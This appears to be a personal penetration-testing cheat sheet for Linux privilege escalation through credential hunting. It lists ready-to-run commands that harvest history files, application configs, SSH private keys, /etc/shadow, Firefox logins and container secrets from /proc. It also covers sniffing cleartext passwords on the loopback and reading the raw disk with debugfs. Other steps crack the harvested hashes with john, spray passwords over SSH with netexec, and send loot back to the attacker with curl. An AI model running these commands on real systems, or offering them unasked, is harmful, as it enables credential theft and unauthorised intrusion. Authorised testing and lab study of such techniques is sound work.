# Linux privesc: credential hunting

## History files
cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.python_history 2>/dev/null
find / -name '.*_history' -readable -exec ls -la {} \; 2>/dev/null

## Web and application configs
ls -la /var/www /var/www/html
grep -E 'DB_(USER|PASSWORD)' /var/www/html/wp-config.php 2>/dev/null
find /var/www /opt /srv -type f \( -name '*.php' -o -name '*.env' -o -name '*.conf' -o -name '*.ini' -o -name '*.yml' -o -name '*.json' \) -exec grep -liE 'pass|secret|key' {} + 2>/dev/null
cat /etc/mysql/my.cnf ~/.my.cnf 2>/dev/null
- [ ] A database login: the database read for more users and hashes, and :Pb mysql-udf when mysqld runs as root

## Keyword grep
grep -rniIE 'passw|secret|credential|api_key|token' /home /var/www /opt /etc /srv 2>/dev/null | head -n 100

## Backups and stray files
find / \( -path /proc -o -path /sys \) -prune -o -type f \( -name '*.bak' -o -name '*.old' -o -name '*.save' -o -name '*.orig' -o -name '*.tar.gz' -o -name '*.zip' -o -name '*.kdbx' \) -print 2>/dev/null
ls -la /var/backups /opt /srv /mnt 2>/dev/null
- [ ] Anything worth keeping sent back with the curl -T line serve files gives, into loot/
- [ ] A .kdbx or a zip with a password: keepass2john or zip2john on Kali, then john

## SSH keys
find / \( -name 'id_rsa*' -o -name 'id_ecdsa*' -o -name 'id_ed25519*' -o -name 'authorized_keys' \) 2>/dev/null
find / \( -name '*.pem' -o -name '*.key' \) -not -path '/proc/*' 2>/dev/null
ls -la /home/*/.ssh 2>/dev/null
On Kali, with a private key I found:
chmod 600 id_rsa
ssh -i id_rsa root@<TargetIP>
ssh -i id_rsa '<TargetUser>'@<TargetIP>
- [ ] A key with a passphrase: ssh2john id_rsa > hash.txt, then john

## Other stores
cat ~/.git-credentials ~/.netrc ~/.pgpass 2>/dev/null
ls -la ~/.config ~/.local/share/keyrings 2>/dev/null
find / -name logins.json 2>/dev/null
A Firefox profile, packed up to send back:
tar czf /dev/shm/ff.tgz -C ~/.mozilla firefox
On Kali, with THE-PROFILE-FOLDER the one holding logins.json:
python3 firefox_decrypt.py THE-PROFILE-FOLDER

## Cleartext on the loopback
Only with root, cap_net_raw on tcpdump, or a group such as pcap or wireshark:
getcap $(which tcpdump)
timeout 300 tcpdump -l -i lo -nn -A 'port 21 or port 23 or port 80 or port 110' 2>/dev/null | grep -iE 'user|pass|authorization'

## A shadow I can read
ls -la /etc/shadow /var/backups/shadow* 2>/dev/null
On Kali, with both files sent back:
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
- [ ] yescrypt hashes, starting $y$: john --format=crypt

## Try every password
su - root
su - '<TargetUser>'
sudo -l
At the pwn-broker prompt: tool install netexec.
On Kali, against every user with a shell, in users.txt:
nxc ssh <TargetIP> -u users.txt -p '<Password>' --continue-on-success
- [ ] A database password is often a user's as well, or root's
- [ ] The password worked for su: :Pb sudo for that user, and :Pb linux-enum again

## The disk group: read the raw device
A member of the disk group reads the block device itself, past every file permission.
- [ ] id shows the disk group, and df / names the device, here /dev/sda1
debugfs -R 'cat /etc/shadow' /dev/sda1
debugfs -R 'ls /root' /dev/sda1
- [ ] Whatever the listing shows, read the same way: root's SSH key first
- [ ] No permission is checked: this reads the filesystem, and opens no file

## Inside a container: the environment
Containers are given their secrets through the environment, and /proc shows it.
cat /proc/1/environ | tr '\0' '\n'
cat /proc/1/cmdline | tr '\0' ' '
ls /run/secrets
- [ ] Every other process the same way, through /proc/*/environ
- [ ] Mounted secrets in /run/secrets, each one a file to read
